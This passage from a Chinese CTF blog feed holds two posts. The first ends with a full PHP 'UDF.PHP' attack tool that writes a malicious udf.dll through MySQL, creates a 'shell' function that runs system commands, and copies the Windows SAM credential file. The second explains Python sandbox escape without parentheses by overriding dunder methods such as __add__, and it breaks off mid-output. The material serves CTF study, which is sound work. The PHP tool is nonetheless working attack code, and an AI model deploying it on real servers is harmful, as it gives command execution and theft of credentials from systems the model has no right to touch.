class="line">mysql_select_db(&#39;mysql&#39;,$conn);</span><br><span class="line">mysql_query(&#39;CREATE TABLE &#96;func&#96; ( &#96;name&#96; char(64) collate utf8_bin NOT NULL default \&#39;\&#39;, &#96;ret&#96; tinyint(1) NOT NULL default \&#39;0\&#39;, &#96;dl&#96; char(128) collate utf8_bin NOT NULL default \&#39;\&#39;, &#96;type&#96; enum(\&#39;function\&#39;,\&#39;aggregate\&#39;) character set utf8 NOT NULL, PRIMARY KEY (&#96;name&#96;) ) ENGINE&#x3D;MyISAM DEFAULT CHARSET&#x3D;utf8 COLLATE&#x3D;utf8_bin COMMENT&#x3D;\&#39;User defined functions\&#39;&#39;);</span><br><span class="line">if (mysql_errno($conn) !&#x3D; 0) &#123;</span><br><span class="line">echo mysql_error() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;Create mysql.func success !&#39;;</span><br><span class="line">mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line">function conn($close &#x3D; true) &#123;</span><br><span class="line">if (isset($_SESSION[&#39;host&#39;])) &#123;</span><br><span class="line">$host &#x3D; $_SESSION[&#39;host&#39;];</span><br><span class="line">$uid &#x3D; $_SESSION[&#39;uid&#39;];</span><br><span class="line">$pwd &#x3D; $_SESSION[&#39;pwd&#39;];</span><br><span class="line">$db &#x3D; $_SESSION[&#39;db&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$host &#x3D; $_POST[&#39;host&#39;];</span><br><span class="line">$uid &#x3D; $_POST[&#39;uid&#39;];</span><br><span class="line">$pwd &#x3D; $_POST[&#39;pwd&#39;];</span><br><span class="line">$db &#x3D; $_POST[&#39;db&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$conn &#x3D; mysql_connect($host,$uid,$pwd);</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">echo mysql_error().&#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">vConn();</span><br><span class="line">exit();</span><br><span class="line">&#125; </span><br><span class="line">mysql_select_db($db,$conn);</span><br><span class="line">if (mysql_errno($conn) !&#x3D; 0) &#123;</span><br><span class="line">echo mysql_error().&#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">vConn();</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[&#39;host&#39;] &#x3D; $host;</span><br><span class="line">$_SESSION[&#39;uid&#39;] &#x3D; $uid;</span><br><span class="line">$_SESSION[&#39;pwd&#39;] &#x3D; $pwd;</span><br><span class="line">$_SESSION[&#39;db&#39;] &#x3D; $db;</span><br><span class="line">&#x2F;&#x2F;mysql_query(&#39;set names utf8&#39;);</span><br><span class="line">showM($conn,$close);</span><br><span class="line">return $conn;</span><br><span class="line">&#125;</span><br><span class="line">function logout()&#123;</span><br><span class="line">unset($_SESSION[&#39;host&#39;]);</span><br><span class="line">unset($_SESSION[&#39;uid&#39;]);</span><br><span class="line">unset($_SESSION[&#39;pwd&#39;]);</span><br><span class="line">unset($_SESSION[&#39;db&#39;]);</span><br><span class="line">unset($_SESSION[&#39;notsame&#39;]);</span><br><span class="line">unset($_SESSION[&#39;over51&#39;]);</span><br><span class="line">unset($_SESSION[&#39;plugindir&#39;]);</span><br><span class="line">$url &#x3D; $_SERVER[&#39;PHP_SELF&#39;]; </span><br><span class="line">$filename &#x3D; end(explode(&#39;&#x2F;&#39;,$url));  </span><br><span class="line">echo &#39;&lt;script&gt;location.href &#x3D; &quot;&#39;.$filename.&#39;?rn&#x3D;&quot;+Math.random()&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">function showM(&amp;$conn,$close &#x3D; true)&#123;</span><br><span class="line">echo &#39;&lt;center&gt;&lt;b&gt;t00ls UDF.PHP&lt;&#x2F;b&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;logout&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Logout&quot;&gt;&lt;&#x2F;form&gt;&#39;;</span><br><span class="line">echo &#39;&lt;div style&#x3D;&quot;border:solid 1px #333;background-color:#999;padding:4px&quot;&gt;&#39;;</span><br><span class="line">$sql &#x3D; &#39;select concat(\&#39;&lt;b&gt;user()&lt;&#x2F;b&gt;:\&#39;,user()) as m union select concat(\&#39;&lt;b&gt;database():&lt;&#x2F;b&gt;\&#39;,database()) union select concat(\&#39;&lt;b&gt;datadir&lt;&#x2F;b&gt;:\&#39;,@@datadir) union select concat(\&#39;&lt;b&gt;basedir&lt;&#x2F;b&gt;:\&#39;,@@basedir) union select concat(\&#39;&lt;b&gt;version()&lt;&#x2F;b&gt;:\&#39;,version()) ;&#39;;</span><br><span class="line">$meta &#x3D; mysql_query($sql,$conn);</span><br><span class="line">$tmp &#x3D; 1;</span><br><span class="line">while ($row &#x3D; mysql_fetch_array($meta,MYSQL_ASSOC)) &#123;</span><br><span class="line">echo $row[&#39;m&#39;];</span><br><span class="line">if ($tmp &#x3D;&#x3D; 1) &#123;</span><br><span class="line">$tmp &#x3D; 2;</span><br><span class="line">$h &#x3D; substr($row[&#39;m&#39;],strpos($row[&#39;m&#39;],&#39;@&#39;)+1);</span><br><span class="line">if ($h !&#x3D; &#39;localhost&#39;) &#123;</span><br><span class="line">echo &#39; &lt;b&gt;&lt;i&gt;&lt;font color&#x3D;green&gt;[web and db is not the same server.]&lt;&#x2F;font&gt;&lt;&#x2F;i&gt;&lt;&#x2F;b&gt;&#39;;</span><br><span class="line">$_SESSION[&#39;notsame&#39;] &#x3D; &#39;true&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;b&gt;plugin_dir&lt;&#x2F;b&gt;:&#39;;</span><br><span class="line">$meta &#x3D; mysql_query(&#39;show variables like &quot;plugin_dir&quot;&#39;);</span><br><span class="line">if (mysql_num_rows($meta)&#x3D;&#x3D;0) &#123;</span><br><span class="line">echo &#39;&lt;font color&#x3D;white&gt;mysql is under 5.1 , &#39;;</span><br><span class="line">if (!isset($_SESSION[&#39;notsame&#39;]))</span><br><span class="line">echo &#39; u can dump udf.dll to any directory in follow paths&#39;;</span><br><span class="line">echo &#39;&lt;&#x2F;font&gt;&#39;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">&#x2F;&#x2F;over 5.1</span><br><span class="line">$_SESSION[&#39;over51&#39;] &#x3D; &#39;true&#39;;</span><br><span class="line">$row &#x3D; mysql_fetch_row($meta);</span><br><span class="line">$_SESSION[&#39;plugindir&#39;] &#x3D; str_replace(&#39;\\&#39;,&#39;\\\\&#39;,str_replace(&#39;&#x2F;&#39;,&#39;\\&#39;,$row[1])).&#39;\\\\udf.dll&#39;;</span><br><span class="line">echo &#39;&lt;font color&#x3D;white&gt;&#39;.str_replace(&#39;&#x2F;&#39;,&#39;\\&#39;,$row[1]).&#39;&lt;&#x2F;font&gt;&#39;;</span><br><span class="line">echo &#39; (mysql over 5.1, udf.dll can only dump to plugin_dir) &#39;;</span><br><span class="line">if (isset($_SESSION[&#39;notsame&#39;])) </span><br><span class="line">echo &#39; &lt;font&gt;&lt;b&gt;&lt;i&gt;[maybe dump dll will be failed!]&lt;&#x2F;i&gt;&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;&#39;;</span><br><span class="line">else &#123;</span><br><span class="line">if (!file_exists(str_replace(&#39;&#x2F;&#39;,&#39;\\&#39;,$row[1]))) </span><br><span class="line">echo &#39; &lt;a href&#x3D;&quot;?action&#x3D;cplug&amp;dir&#x3D;&#39;.base64_encode(str_replace(&#39;&#x2F;&#39;,&#39;\\&#39;,$row[1])).&#39;&quot;&gt;Create PluginDir&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">else </span><br><span class="line">echo &#39; exists!&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">if (!isset($_SESSION[&#39;notsame&#39;]) &amp;&amp; !isset($_SESSION[&#39;over51&#39;]))</span><br><span class="line">echo &#39;&lt;b&gt;path&lt;&#x2F;b&gt;:&lt;font color&#x3D;green&gt;&lt;b&gt;&#39;.getenv(&#39;path&#39;).&#39;&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line"> $meta &#x3D; mysql_query(&#39;select 1,1,1,1 from mysql.user union select * from mysql.func&#39;);</span><br><span class="line">if (mysql_num_rows($meta)&#x3D;&#x3D;0)</span><br><span class="line">echo &#39;&lt;b&gt;Mysql.Func&lt;&#x2F;b&gt; : &lt;font color&#x3D;white&gt;&lt;b&gt;&lt;i&gt;&lt;font color&#x3D;red&gt;dont exist!&lt;&#x2F;font&gt;&lt;&#x2F;i&gt;&lt;&#x2F;b&gt;&lt;&#x2F;font&gt; must &lt;a href&#x3D;&quot;?action&#x3D;func&quot;&gt;create&lt;&#x2F;a&gt; mysql.func first!&#39;;</span><br><span class="line">else </span><br><span class="line">echo &#39;&lt;b&gt;Mysql.Func&lt;&#x2F;b&gt; : &lt;font color&#x3D;green&gt;exist!&lt;&#x2F;font&gt;&#39;;</span><br><span class="line">echo &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">echo &#39;&lt;b&gt;grants&lt;&#x2F;b&gt; : &lt;font color&#x3D;white&gt;&#39;;</span><br><span class="line">$meta &#x3D; mysql_query(&#39;show grants;&#39;,$conn);</span><br><span class="line">while ($row &#x3D; mysql_fetch_row($meta)) &#123;</span><br><span class="line">echo $row[0];</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;&#x2F;font&gt;&#39;;</span><br><span class="line">echo &#39;&lt;&#x2F;div&gt;&#39;;</span><br><span class="line">if ($close)</span><br><span class="line">mysql_close($conn);</span><br><span class="line">echo &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">if (isset($_POST[&#39;path&#39;])) &#123;</span><br><span class="line">$path &#x3D; $_POST[&#39;path&#39;];</span><br><span class="line">if (get_magic_quotes_gpc()) </span><br><span class="line">$path &#x3D; stripslashes($path);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">$path &#x3D; isset($_SESSION[&#39;plugindir&#39;]) ? $_SESSION[&#39;plugindir&#39;] : &#39;c:\\\\windows\\\\system32\\\\udf.dll&#39;;</span><br><span class="line">echo &#39;&lt;div style&#x3D;&quot;border:solid 1px #333;background-color:#999;padding:4px&quot;&gt;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;install&quot;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;path&quot; size&#x3D;&quot;60&quot; value&#x3D;&quot;&#39;.$path.&#39;&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Dump UDF&quot;&gt;&lt;&#x2F;form&gt;&#39;;</span><br><span class="line">echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;exec&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;dump&quot; value&#x3D;&quot;d&quot;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;sql&quot; size&#x3D;&quot;60&quot; value&#x3D;&quot;CREATE FUNCTION shell RETURNS STRING SONAME \&#39;udf.dll\&#39;&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Create Function&quot;&gt;&lt;&#x2F;form&gt;&#39;;</span><br><span class="line">echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;copy&quot;&gt;&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;c:\\\\WINDOWS\\\\repair\\\\sam&quot; name&#x3D;&quot;source&quot; size&#x3D;30&gt;  &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;target&quot; size&#x3D;30&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Copy&quot;&gt; &lt;font color&#x3D;white&gt;please convert \\ to \\\\&lt;&#x2F;font&gt;&lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&#39;;</span><br><span class="line">if (isset($_POST[&#39;sql&#39;]))</span><br><span class="line">$sql &#x3D; $_POST[&#39;sql&#39;];</span><br><span class="line">else</span><br><span class="line">$sql &#x3D; &#39;select * from mysql.user&#39;;</span><br><span class="line">if (get_magic_quotes_gpc())</span><br><span class="line">$sql &#x3D; stripslashes($sql);</span><br><span class="line">if (isset($_POST[&#39;dump&#39;]))</span><br><span class="line">$sql &#x3D; &#39;select shell(\&#39;cmd\&#39;,\&#39;whoami\&#39;)&#39;;</span><br><span class="line">echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;exec&quot;&gt;&lt;textarea id&#x3D;&quot;sql2&quot; cols&#x3D;&quot;100&quot; rows&#x3D;&quot;5&quot; name&#x3D;&quot;sql&quot;&gt;&#39;.$sql.&#39;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Mysql_query&quot;&gt; &lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;Load_File&quot; onclick&#x3D;&quot;loadfile()&quot;&gt; &lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;Into OutFile&quot; onclick&#x3D;&quot;outfile()&quot;&gt;&lt;&#x2F;form&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">function cplug()&#123;</span><br><span class="line">$path &#x3D; $_GET[&#39;dir&#39;];</span><br><span class="line">$path &#x3D; base64_decode($path);</span><br><span class="line">$arr &#x3D; explode(&#39;\\&#39;,$path);</span><br><span class="line">$p &#x3D; &#39;&#39;;</span><br><span class="line">$err &#x3D; &#39;&#39;;</span><br><span class="line">for ($index &#x3D; 0,$count &#x3D; count($arr);$index&lt;$count;$index++) &#123;</span><br><span class="line">$p .&#x3D; ($arr[$index] . &#39;\\&#39;);</span><br><span class="line">if (!file_exists($p)) &#123;</span><br><span class="line">if (!mkdir($p)) &#123;</span><br><span class="line">$err &#x3D; &#39;create &#39;.$p.&#39;failed !&#39;;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">conn();</span><br><span class="line">if ($err !&#x3D; &#39;&#39;)</span><br><span class="line">exit($err);</span><br><span class="line">if (file_exists($path))</span><br><span class="line">echo &#39;plugin_dir create success !&#39;;</span><br><span class="line">else</span><br><span class="line">echo &#39;plugin_dir create failed !&#39;;</span><br><span class="line">&#125;</span><br><span class="line">function execsql() &#123;</span><br><span class="line">$conn &#x3D; conn(false);</span><br><span class="line">$sql &#x3D; $_POST[&#39;sql&#39;];</span><br><span class="line">if (get_magic_quotes_gpc())</span><br><span class="line">$sql &#x3D; stripslashes($sql);</span><br><span class="line">$rs &#x3D; mysql_query($sql,$conn);</span><br><span class="line">echo mysql_info($conn);</span><br><span class="line">if (@mysql_num_rows($rs) &gt; 0) &#123;</span><br><span class="line">echo &#39;&lt;table border&#x3D;&quot;1&quot;&gt;&#39;;</span><br><span class="line">$cols &#x3D; mysql_num_fields($rs);</span><br><span class="line">$index &#x3D; 0;</span><br><span class="line">echo &#39;&lt;tr&gt;&#39;;</span><br><span class="line">while ($index &lt; $cols) &#123;</span><br><span class="line">echo &#39;&lt;th&gt;&#39;.mysql_field_name($rs,$index).&#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">$index ++;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line">while ($row &#x3D; mysql_fetch_row($rs)) &#123;</span><br><span class="line">$index &#x3D; 0;</span><br><span class="line">echo &#39;&lt;tr&gt;&#39;;</span><br><span class="line">while ($index &lt; $cols) &#123;</span><br><span class="line">echo &#39;&lt;td&gt;&#39;;</span><br><span class="line">echo str_replace(chr(13),&#39;&lt;br&#x2F;&gt;&#39;,htmlspecialchars($row[$index]));</span><br><span class="line">echo &#39;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">$index ++;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line"> &#125;</span><br><span class="line">echo &#39;&lt;&#x2F;table&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if (mysql_errno($conn) !&#x3D; 0)</span><br><span class="line">echo mysql_error();</span><br><span class="line">mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line">function cp()&#123;</span><br><span class="line">$conn &#x3D; conn(false);</span><br><span class="line">$source &#x3D; $_POST[&#39;source&#39;];</span><br><span class="line">$target &#x3D; $_POST[&#39;target&#39;];</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">$source &#x3D; stripslashes($source);</span><br><span class="line">$target &#x3D; stripslashes($target);</span><br><span class="line">&#125;</span><br><span class="line">mysql_query(&#39;select unhex(hex(load_file(&quot;&#39;.$source.&#39;&quot;))) into dumpfile &quot;&#39;.$target.&#39;&quot;&#39;);</span><br><span class="line">if (mysql_errno($conn) !&#x3D; 0)</span><br><span class="line">echo mysql_error().&#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">else</span><br><span class="line">echo &#39;done !&#39;;</span><br><span class="line">mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line">function install() &#123;</span><br><span class="line">&#x2F;&#x2F;dump udf.dll</span><br><span class="line">$conn &#x3D; conn(false);</span><br><span class="line">$path &#x3D; $_POST[&#39;path&#39;];</span><br><span class="line">if (get_magic_quotes_gpc()) </span><br><span class="line">$path &#x3D; stripslashes($path);</span><br><span class="line">mysql_query(&#39;create table udftmp (c blob)&#39;);</span><br><span class="line">if (mysql_errno($conn) !&#x3D; 0) &#123;</span><br><span class="line">echo mysql_error().&#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">mysql_query(&#39;drop table udftmp&#39;);</span><br><span class="line">mysql_close($conn);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">mysql_query(&#39;insert into udftmp values(convert(0xspan><br><span class="line">if (mysql_errno($conn) !&#x3D; 0) &#123;</span><br><span class="line">echo mysql_error().&#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">mysql_close($conn);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">mysql_query(&#39;select c from udftmp into dumpfile &quot;&#39;.$path.&#39;&quot;&#39;);</span><br><span class="line">if (mysql_errno($conn) !&#x3D; 0) &#123;</span><br><span class="line">echo mysql_error(). &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">mysql_query(&#39;drop table udftmp&#39;);</span><br><span class="line">mysql_close($conn);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">mysql_query(&#39;drop table udftmp&#39;);</span><br><span class="line">if (mysql_errno($conn) !&#x3D;0)</span><br><span class="line">echo &#39;Dump DLL Failed.&#39;.mysql_error();</span><br><span class="line">else</span><br><span class="line">echo &#39;Dump DLL Success!&#39;;</span><br><span class="line">mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>同时，Navicat MySQL可以处理目标 MySQL 不允许外连，但是可以上传 PHP 脚本情况（展示没到这个软件）</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://www.sqlsec.com/2020/11/mysql.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/11/mysql.html</a></p><p><a href="https://www.51cto.com/article/534004.html" target="_blank" rel="noopener">https://www.51cto.com/article/534004.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-sandbox bypass &#39;(&#39; and &#39;)&#39; to  calling function</title>
      <link href="/2023/04/20/python-sandbox%20bypass%20&#39;()&#39;%20to%20%20runing%20function/"/>
      <url>/2023/04/20/python-sandbox%20bypass%20&#39;()&#39;%20to%20%20runing%20function/</url>
      
        <content type="html"><![CDATA[<p>Python sandbox 逃逸是我入ctf 这个坑第一个接触的课题，当时这个考点有两种考法一个是ssti，另一个是python jail。但是随着探讨下来，Python sandbox 过滤掉<code>(</code>与<code>)</code> 两个括号还能否执行函数？是否还能import os 执行 <code>/bin/sh</code>这是个一直困扰我的问题。<a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个问题来源hack the box 一个flask 题目提到 一个奇怪的waf。这个waf  提到”(){}[]@” ,但是按照我们正常的思路，只要ban了<code>{}</code>了，ssti这路就不行。但是为什么要提到<code>()</code>? 于是我想到说不定python有方法做到，不用<code>()</code>就可以做到执行函数方法（执行<code>__call__</code>）。</p><h2 id="object属性与内置函数"><a href="#object属性与内置函数" class="headerlink" title="object属性与内置函数"></a>object属性与内置函数</h2><p>我们知道<strong>对象</strong>（ob） 是 Python 中对数据的抽象。 Python 程序中的所有数据都是由对象或对象间关系来表示的。同时，我们也知道 “x+y” 两变量相加，过程其实是将<code>+</code>转换调用<code>type(x).__add__(x, y)</code> 即调用x对象的父类的·<code>__add__</code>方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x&#x3D;1</span><br><span class="line">&gt;&gt;&gt; y&#x3D;2</span><br><span class="line">&gt;&gt;&gt; type(x).__add__(x,y)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; x+y</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>所以我们若讲x的父类的<code>__add__</code>覆盖成我们想要的函数，那么就可以用<code>+</code>来执行函数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">type</span>(x).__add__=<span class="built_in">print</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: can<span class="string">'t set attributes of built-in/extension type '</span>int<span class="string">' # py 3.8.9</span></span><br><span class="line"><span class="string">TypeError: cannot set '</span>__add__<span class="string">' attribute of immutable type '</span>int<span class="string">'# py 3.10.7</span></span><br></pre></td></tr></table></figure><p>但是我们很快得到一个报错，显示我们无法修改 int class 的<code>__add__</code>属性，但在不同版本中报错描述不同。(应该与3.10版本对python进行大规模改写优化有关)。其中在3.10报错中写到<code>immutable type &#39;int&#39;</code>,在3.8报错中更详细写的 <code>built-in/extension type &#39;int&#39;</code>.所以，可以怀疑因为<code>int</code>是内置class（或builtins模块中class） 所以设置了保护属性 让 <code>__add__</code>属性 无法被修改。</p><p>因此，我们可以尝试自己定义一个class来尝试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">y=x()</span><br><span class="line">x.__add__=<span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y+<span class="string">'1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>可以看到我们自己定义的类 x 的 <code>__add__</code>被修改为了<code>print</code> ,在运行<code>y+&#39;1&#39;</code>时，成功执行了 print 方法.</p><h3 id="可利用的内置函数"><a href="#可利用的内置函数" class="headerlink" title="可利用的内置函数"></a>可利用的内置函数</h3><p>其实，经过查阅除了<code>__add__</code>外，还有很多内置函数可以让我们利用。</p><h3 id="计算类内置函数"><a href="#计算类内置函数" class="headerlink" title="计算类内置函数"></a>计算类内置函数</h3><table><thead><tr><th>名称</th><th>作用</th><th>触发示例</th></tr></thead><tbody><tr><td><code>object.__add__(self, other)</code></td><td>加法</td><td>x+y</td></tr><tr><td><code>object.__sub__(self, other)</code></td><td>减法</td><td>x-y</td></tr><tr><td><code>object.__mul__(self, other)</code></td><td>乘法</td><td>x*y</td></tr><tr><td><code>object.__truediv__(self, other)</code></td><td>除法</td><td>x/y</td></tr><tr><td><code>object.__floordiv__(self, other)</code></td><td>整除</td><td>x//y</td></tr><tr><td><code>object.__mod__(self, other)</code></td><td>取余</td><td>x%y</td></tr><tr><td><code>object.__pow__(self, other[, modulo])</code></td><td>幂运算</td><td>x**y</td></tr><tr><td><code>object.__lshift__(self, other)</code></td><td>左移</td><td>x&lt;&lt;y</td></tr><tr><td><code>object.__rshift__(self, other)</code></td><td>右移</td><td>x&gt;&gt;y</td></tr><tr><td><code>object.__and__(self, other)</code></td><td>与</td><td>x&amp;y</td></tr><tr><td><code>object.__xor__(self, other)</code></td><td>异或</td><td>x^y</td></tr><tr><td><code>object.__ior__(self, other)</code></td><td>或</td><td>x|y</td></tr></tbody></table><h3 id="比较内置函数"><a href="#比较内置函数" class="headerlink" title="比较内置函数"></a>比较内置函数</h3><table><thead><tr><th>名称</th><th>作用</th><th>触发示例</th></tr></thead><tbody><tr><td><code>__lt__</code></td><td>小于</td><td>x&lt;y</td></tr><tr><td><code>__le__</code></td><td>小于等于</td><td>x&lt;=y</td></tr><tr><td><code>__eq__</code></td><td>等于</td><td>x==y</td></tr><tr><td><code>__ne__</code></td><td>不等于</td><td>x!=y</td></tr><tr><td><code>__ge__</code></td><td>大于等于</td><td>x&gt;=y</td></tr><tr><td><code>__gt__</code></td><td>等于</td><td>x&gt;y</td></tr></tbody></table><h3 id="特殊内置函数"><a href="#特殊内置函数" class="headerlink" title="特殊内置函数"></a>特殊内置函数</h3><table><thead><tr><th>名称</th><th>作用</th><th>触发示例</th></tr></thead><tbody><tr><td><code>__getitem__</code></td><td>我们用中括号对象中元素的查询</td><td>x[y]</td></tr><tr><td><code>__getattr__</code></td><td>获取对象的属性</td><td>x.y</td></tr><tr><td><code>__getattribute__</code></td><td>在<code>__getattr__</code>未找到属性时调用</td><td>x.y</td></tr></tbody></table><h2 id="builtins中的内鬼"><a href="#builtins中的内鬼" class="headerlink" title="builtins中的内鬼"></a>builtins中的内鬼</h2><p>之前在对<code>int.__add__</code>进行覆盖时，发现触发了报错。这报错让我们知道 Built-in  中的属于是 无法修改的。但是我写了个小工具，来遍历<code>builtins</code> 模块.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">x=__builtins__.__dir__()</span><br><span class="line"><span class="comment">#x=os.__dir__()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    print(str(getattr(__builtins__,i).__class__)+<span class="string">' name:'</span>+i)</span><br></pre></td></tr></table></figure><p>出乎意料地得到一个有意思的结果：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 